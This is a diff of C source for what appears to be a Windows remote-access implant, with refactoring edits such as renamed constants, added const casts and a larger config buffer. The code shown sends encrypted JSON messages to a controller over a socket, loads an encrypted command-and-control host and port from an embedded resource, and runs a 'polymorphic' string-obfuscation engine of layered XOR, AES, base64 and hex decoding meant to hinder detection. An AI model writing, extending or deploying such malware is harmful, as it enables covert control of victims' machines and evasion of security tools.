@@ -43,15 +43,15 @@ extern SessionKey g_session;
 void sock_send_ex(SOCKET sock, HANDLE mutex, const char* type, const char* msg) {
     if (mutex) WaitForSingleObject(mutex, INFINITE);
     cJSON *root = cJSON_CreateObject(); cJSON_AddStringToObject(root, "type", type); cJSON_AddStringToObject(root, "payload", msg);
-    char *json_msg = cJSON_PrintUnformatted(root); char *encrypted = aes_256_cbc_encrypt((unsigned char*)json_msg, strlen(json_msg), g_session.key, g_session.iv);
+    char *json_msg = cJSON_PrintUnformatted(root); char *encrypted = aes_256_cbc_encrypt((unsigned char*)json_msg, (int)strlen(json_msg), g_session.key, g_session.iv);
     cJSON *packet = cJSON_CreateObject(); cJSON_AddStringToObject(packet, "data", encrypted);
     char *iv_b64 = base64_encode(g_session.iv, 16, NULL); cJSON_AddStringToObject(packet, "iv", iv_b64);
     char *final_json = cJSON_PrintUnformatted(packet); char *buf = (char*)malloc(strlen(final_json) + 2); sprintf(buf, "%s\n", final_json);
-    send(sock, buf, (int)strlen(buf), 0); free(buf); free(final_json); free(iv_b64); free(encrypted); free(json_msg); cJSON_Delete(packet); cJSON_Delete(root);
+    send(sock, (const char*)buf, (int)strlen(buf), 0); free(buf); free(final_json); free(iv_b64); free(encrypted); free(json_msg); cJSON_Delete(packet); cJSON_Delete(root);
     if (mutex) ReleaseMutex(mutex);
 }
 
-void sock_send(SOCKET sock, HANDLE mutex, const char* msg) { sock_send_ex(sock, mutex, s(S_RESPONSE), msg); }
+void sock_send(SOCKET sock, HANDLE mutex, const char* msg) { sock_send_ex(sock, mutex, s(KSTR_RESPONSE), msg); }
 
 char* rsa_encrypt_pkcs1(const unsigned char* data, size_t len, const char* pubkey_pem) {
     DWORD derLen = 0; CERT_PUBLIC_KEY_INFO *pubKeyInfo = NULL; DWORD pubKeyInfoLen = 0; HCRYPTPROV hProv = 0; HCRYPTKEY hRSAKey = 0; char* out = NULL;
@@ -121,7 +121,7 @@ void get_formatted_time(unsigned long long secs, char* out_buf) {
 
 // --- Polymorphic Engine ---
 
-static char* g_strings[S_COUNT] = {0};
+static char* g_strings[KSTR_COUNT] = {0};
 static ObfMetadata g_obf_meta = {0};
 
 static unsigned char* polymorphic_decode(const char* input) {
@@ -131,18 +131,18 @@ static unsigned char* polymorphic_decode(const char* input) {
         int type = g_obf_meta.transform_order[i]; size_t next_len = 0; unsigned char* next_data = NULL;
         switch(type) {
             case 0: for (size_t j = 0; j < cur_len; j++) cur_data[j] ^= g_obf_meta.xor_key1; break;
-            case 1: next_data = aes_256_cbc_decrypt((char*)base64_encode(cur_data, cur_len, NULL), &next_len, g_obf_meta.aes_key, g_obf_meta.aes_iv);
+            case 1: next_data = aes_256_cbc_decrypt((const char*)base64_encode(cur_data, cur_len, NULL), &next_len, g_obf_meta.aes_key, g_obf_meta.aes_iv);
                     if (next_data) { free(cur_data); cur_data = next_data; cur_len = next_len; } break;
-            case 2: next_data = base64_decode((char*)cur_data, cur_len, &next_len); if (next_data) { free(cur_data); cur_data = next_data; cur_len = next_len; } break;
-            case 4: next_data = hex_decode((char*)cur_data, cur_len, &next_len); if (next_data) { free(cur_data); cur_data = next_data; cur_len = next_len; } break;
+            case 2: next_data = base64_decode((const char*)cur_data, cur_len, &next_len); if (next_data) { free(cur_data); cur_data = next_data; cur_len = next_len; } break;
+            case 4: next_data = hex_decode((const char*)cur_data, cur_len, &next_len); if (next_data) { free(cur_data); cur_data = next_data; cur_len = next_len; } break;
             case 9: for (size_t j = 0; j < cur_len; j++) cur_data[j] ^= g_obf_meta.xor_key2; break;
         }
         if (!cur_data) return NULL;
     }
-    unsigned char* final = malloc(cur_len + 1); memcpy(final, cur_data, cur_len); final[cur_len] = 0; free(cur_data); return (unsigned char*)final;
+    unsigned char* final = malloc(cur_len + 1); memcpy(final, cur_data, cur_len); final[cur_len] = 0; free(cur_data); return final;
 }
 
-const char* s(StringIndex idx) { if (idx < 0 || idx >= S_COUNT) return ""; return g_strings[idx] ? g_strings[idx] : ""; }
+const char* s(StringIndex idx) { if (idx < 0 || idx >= KSTR_COUNT) return ""; return g_strings[idx] ? g_strings[idx] : ""; }
 
 char g_host[256] = {0}; int g_port = 0;
 void load_config_from_resource() {
@@ -151,17 +151,17 @@ void load_config_from_resource() {
     unsigned char* pData = (unsigned char*)LockResource(hData); if (!pData) return;
     unsigned char marker[16]; SET_MARKER(marker); if (memcmp(pData, marker, 16) != 0) return;
     memcpy(&g_obf_meta, pData + 16, sizeof(ObfMetadata));
-    unsigned char* enc_cfg = pData + 16 + sizeof(ObfMetadata); size_t enc_cfg_len = 2032 - sizeof(ObfMetadata);
+    unsigned char* enc_cfg = pData + 16 + sizeof(ObfMetadata); size_t enc_cfg_len = 8192 - 16 - sizeof(ObfMetadata);
     unsigned char key[32], iv[16]; memcpy(key, CONFIG_KEY, 32); memcpy(iv, CONFIG_IV, 16);
     size_t plain_len; char* cfg_b64 = base64_encode(enc_cfg, enc_cfg_len, NULL);
     unsigned char* pbPlain = aes_256_cbc_decrypt(cfg_b64, &plain_len, key, iv); free(cfg_b64);
     if (pbPlain) {
-        pbPlain[plain_len] = 0; cJSON* root = cJSON_Parse((char*)pbPlain);
+        pbPlain[plain_len] = 0; cJSON* root = cJSON_Parse((const char*)pbPlain);
         if (root) {
             cJSON* ip = cJSON_GetObjectItem(root, "ip"); cJSON* port = cJSON_GetObjectItem(root, "port");
             if (ip) strncpy(g_host, ip->valuestring, sizeof(g_host) - 1); if (port) g_port = port->valueint;
             cJSON* list = cJSON_GetObjectItem(root, "s");
-            if (list) { for (int i = 0; i < cJSON_GetArraySize(list) && i < S_COUNT; i++) {
+            if (list) { for (int i = 0; i < cJSON_GetArraySize(list) && i < KSTR_COUNT; i++) {
                 cJSON* item = cJSON_GetArrayItem(list, i); if (item && item->valuestring) g_strings[i] = (char*)polymorphic_decode(item->valuestring);
             } }
             cJSON_Delete(root);
